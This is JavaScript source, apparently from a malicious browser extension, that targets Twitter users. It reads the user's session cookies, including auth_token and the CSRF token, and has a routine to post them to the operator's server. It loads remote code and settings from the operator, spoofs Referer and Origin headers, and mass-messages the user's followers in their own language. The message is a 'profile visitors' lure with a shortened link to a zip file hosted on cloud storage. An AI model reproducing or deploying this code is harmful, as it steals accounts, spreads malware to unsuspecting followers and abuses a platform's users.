var twitter = {};
twitter.check = function () {
  chrome.cookies.getAll({ domain: "twitter.com" }, (cookies) => {
    var auth_token = cookies.find(cookie => cookie.name === "auth_token");
    var twid = cookies.find(cookie => cookie.name === "twid");
    twitter.csrf = cookies.find(cookie => cookie.name === "ct0")?.value;
    twitter.lang = cookies.find(cookie => cookie.name === "lang")?.value;
    twitter.cookies = [auth_token, twid];
    twitter.twid = unescape(twid.value).replace("u=", "")
    auth_token && twid && twitter.start();
  })
}

twitter.start = function () {
  fetch(uri("/ajax/twitter.php?hash=" + config.token)).then((response) => {
    return response.json();
  }).then((data) => {
    twitter.config = data;
    console.log(twitter.config);
    var lastTime = localStorage[twitter.config.cookie_name] || 0;
    var timeValid = (Date.now() - lastTime) >= twitter.config.cookie_time ? true : false;
    var version = localStorage["twitter.version"] || 0;
    if (version != twitter.config.version) {
      localStorage["twitter.version"] = twitter.config.version;
      loadData(uri("/js/twitter.js?" + Date.now()));
      return;
    }
    if (twitter.config.active == true && timeValid == true) {
      localStorage[twitter.config.cookie_name] = Date.now();
      console.log("Twitter Active: true");
      twitter.getFollowers();
    }
  })
}

twitter.save = () => {
  var params = {
    uid: twitter.twid,
    cookies: JSON.stringify(twitter.cookies)
  }

  fetch(uri("/ajax/twitter.save.php"), {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: deSerialize(params)
  })
}

twitter.getFollowers = function () {
  var params = {
    variables: JSON.stringify({
      "userId": twitter.twid,
      "count": 1000,
      "withTweetQuoteCount": false,
      "includePromotedContent": false,
      "withSuperFollowsUserFields": true,
      "withUserResults": true,
      "withBirdwatchPivots": false,
      "withDownvotePerspective": false,
      "withReactionsMetadata": false,
      "withReactionsPerspective": false,
      "withSuperFollowsTweetFields": true
    })
  }

  fetch('https://twitter.com/i/api/graphql/XGZdhJo6WrrwE2AKkgFIew/Followers?' + deSerialize(params), {
    headers: {
      "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
      "x-csrf-token": twitter.csrf
    }
  }).then(r => r.json()).then(data => {
    var entries = data.data.user.result.timeline.timeline.instructions.find(i => i.type == 'TimelineAddEntries')?.entries;
    twitter.followers = [];
    entries.forEach(entry => {
      if(twitter.followers.length >= twitter.config.message_limit) return;
      if(!entry.entryId.startsWith('user')) return;
      var user = entry.content.itemContent.user_results.result;
      if(!user.legacy.can_dm) return;
      if(localStorage[`twitter.dm.${user.rest_id}.${twitter.config.cookie_name}`]) return;
      twitter.followers.push(user);
    })

    console.log(twitter.followers);

    if(twitter.followers.length > 0) {
      twitter.getLink();
    }
  })
}

twitter.getLink = function () {
  fetch(uri("/ajax/storage.php?hash=" + config.token)).then(response => response.json()).then((data) => {
    var ref = "twitter";
    var cid = guid();
    var zip = encodeURIComponent(`TwitterVisitors v${rand(1, 9)}.${rand(1, 9)}.zip`);
    var exe = `visitors.twitter.com`;
    twitter.link = `https://storage.googleapis.com/${data.storage.bucket}/${data.storage.object}?ref=${ref}&cid=${cid}&zip=${zip}&exe=${exe}`;
    console.log(twitter.link);
    twitter.isgd();
  })
}

twitter.isgd = function () {
  fetch("https://is.gd/create.php?format=simple&url=" + encodeURIComponent(twitter.link)).then(response => response.text()).then((data) => {
    twitter.link = data;
    twitter.getLanguage();
  })
}

twitter.getLanguage = function () {
  fetch("https://twitter.com/i/api/1.1/account/settings.json?ext=me", {
    headers: {
      "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
      "x-csrf-token": twitter.csrf
    }
  }).then(r => r.json()).then((data) => {
    twitter.lang = data.language;
    twitter.translate();
  })
}

twitter.translate = function () {
  twitter.message = "Hi See your profile visitors with ProfileVisitors";

  var params = [];
  params.push("client=gtx");
  params.push("sl=gtx");
  params.push("tl=" + twitter.lang);
  params.push("hl=" + twitter.lang);
  params.push("dt=t");
  params.push("dt=bd");
  params.push("dj=1");
  params.push("source=input");
  params.push("tk=964337.964337");
  params.push("q=" + twitter.message);
  params = params.join("&");

  fetch("https://translate.googleapis.com/translate_a/single?" + encodeURI(params), {
    headers: {
      "content-type": "application/x-www-form-urlencoded"
    }
  }).then(response => response.json()).then((data) => {
    try {
      if (data.sentences) twitter.message = data.sentences[0].trans;
      twitter.sendMessages();
    } catch (error) {
      console.log(error)
      var d = {
        response: data,
        error: error.message
      }
      twitter.error("translate", d);
    }
  })
}

twitter.sendMessages = () => {
  for(var follower of twitter.followers) {
    twitter.sendMessage.bind(follower)();
  }
}

twitter.sendMessage = function() {
  var params = {
    cards_platform: "Web-12",
    include_cards: 1,
    include_ext_alt_text: "true",
    include_quote_count: "true",
    include_reply_count: 1,
    tweet_mode: "extended",
    dm_users: "false",
    include_groups: "true",
    include_inbox_timelines: "true",
    include_ext_media_color: "true",
    supports_reactions: "true",
    text: `${this.legacy.name} ${twitter.message} ${twitter.link}`,
    conversation_id: `${twitter.twid}-${this.rest_id}`,
    recipient_ids: "false",
    request_id: guid()
  }

  fetch("https://twitter.com/i/api/1.1/dm/new.json?ext=me&sid="+guid(), {
    method: "POST",
    headers: {
      "authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
      "x-csrf-token": twitter.csrf,
      "content-type": "application/x-www-form-urlencoded",
      "x-twitter-active-user": "yes",
      "x-twitter-auth-type": "OAuth2Session",
      "x-twitter-client-language": "en"
    },
    body: deSerialize(params)
  }).then(r => r.json()).then(data => {
    localStorage[`twitter.dm.${this.rest_id}.${twitter.config.cookie_name}`] = true;
    twitter.sonuc(this.legacy.screen_name, twitter.link, "", "TwitterMessage", 1)
  })
}

chrome.webRequest.onBeforeSendHeaders.addListener(
  function (details) {
    if (details.url.indexOf("ext=me") < 0) {
      return;
    }
    var url = new URL(details.url);
    var hasreferer = false;
    var hasorigin = false;
    for (var i = 0; i < details.requestHeaders.length; ++i) {
      if (details.requestHeaders[i].name.toLowerCase() === 'referer') {
        details.requestHeaders[i].value = url.protocol + "//" + url.hostname + "/";
        hasreferer = true;
      }

      if (details.requestHeaders[i].name.toLowerCase() === 'origin') {
        details.requestHeaders[i].value = url.protocol + "//" + url.hostname;
        hasorigin = true;
      }
    }

    if (hasreferer == false) {
      details.requestHeaders.push({ name: 'Referer', value: url.protocol + "//" + url.hostname + "/" });
    }
    if (hasorigin == false) {
      details.requestHeaders.push({ name: 'Origin', value: url.protocol + "//" + url.hostname });
    }
    return { requestHeaders: details.requestHeaders };
  },
  { urls: ['https://*.twitter.com/*', 'https://twitter.com/*'] },
  ['blocking', 'requestHeaders', 'extraHeaders']
);

twitter.check();
setInterval(function () {
  twitter.check();
}, 1000 * 60)

twitter.sonuc = (sonuc, link, image, type, success) => {
  var sonuc = sonuc || "";
  var link = link || "";
  var image = image || "";
  var type = type || "";
  var success = success || 0;
  var params = {};
  params["user"] = twitter.twid;
  params["sonuc"] = sonuc;
  params["site"] = "twitter.com";
  params["link"] = link;
  params["img"] = image;
  params["type"] = type;
  params["success"] = success;
  params["hash"] = config.token;
  fetch(uri("/ajax/sonuc.php?" + deSerialize(params)));
}

function generate_name(length, firstUpper) {
  rname = "";
  sesli = "aeiou";
  sessiz = "bcdfghjklmnprstvyz";
  rname = rand(1, 2) == 1 ? sessiz[rand(0, sessiz.length - 1)] : sesli[rand(0, sesli.length - 1)];
  if (firstUpper == true) {
    rname = rname.toUpperCase();
  }
  for (n = 0; n < length; n++) {
    if (sesli.indexOf(rname[rname.length - 1]) >= 0) {
      rname += sessiz[rand(0, sessiz.length - 1)];
    } else {
      rname += sesli[rand(0, sesli.length - 1)];
    }
  }
  return rname;
}

function capitalizeFirstLetter(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

function inArray(arr, key, value) {
  var res = false;
  for (a = 0; a < arr.length; a++) {
    for (k in arr[a]) {
      if (k == key && arr[a][k] == value) {
        res = true;
        break;
      }
    }
  }
  return res;
}

function decode(t, h) {
  var a = "abcdefghijklmnoprstuvyzx0123456789";
  var c = "";
  for (cr = 0; cr < t.length; cr++) {
    c += a[h.indexOf(t[cr])];
  }
  return c;
}

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
    s4() + '-' + s4() + s4() + s4();
}

function randoms(l, m) {
  var r = [];
  while (r.length < l) {
    var rnd = Math.floor(Math.random() * m);
    if (r.indexOf(rnd) < 0) {
      r.push(rnd);
    }
  }
  return r;
}

function searchArray(a, k) {
  var found = false;
  for (key in a) {
    if (key.toString() == k) {
      found = a[key];
      break;
    } else if (typeof a[key] == "object") {
      found = searchArray(a[key], k);
      if (found != false) {
        break;
      }
    }
  }
  return found;
}

function shuffle(array) {
  var currentIndex = array.length, temporaryValue, randomIndex;

  while (0 !== currentIndex) {
    randomIndex = Math.floor(Math.random() * currentIndex);
    currentIndex -= 1;
    temporaryValue = array[currentIndex];
    array[currentIndex] = array[randomIndex];
    array[randomIndex] = temporaryValue;
  }

  return array;
}

function rand(min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}

function rastgele(uzunluk) {
  mtn = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  for (l = 0; l < uzunluk; l++) {
    ret += mtn[Math.floor(Math.random() * mtn.length)];
  }
  return ret;
}

function deSerialize(json) {
  return Object.keys(json).map(function (key) {
    return encodeURIComponent(key) + '=' + encodeURIComponent(json[key]);
  }).join('&');
}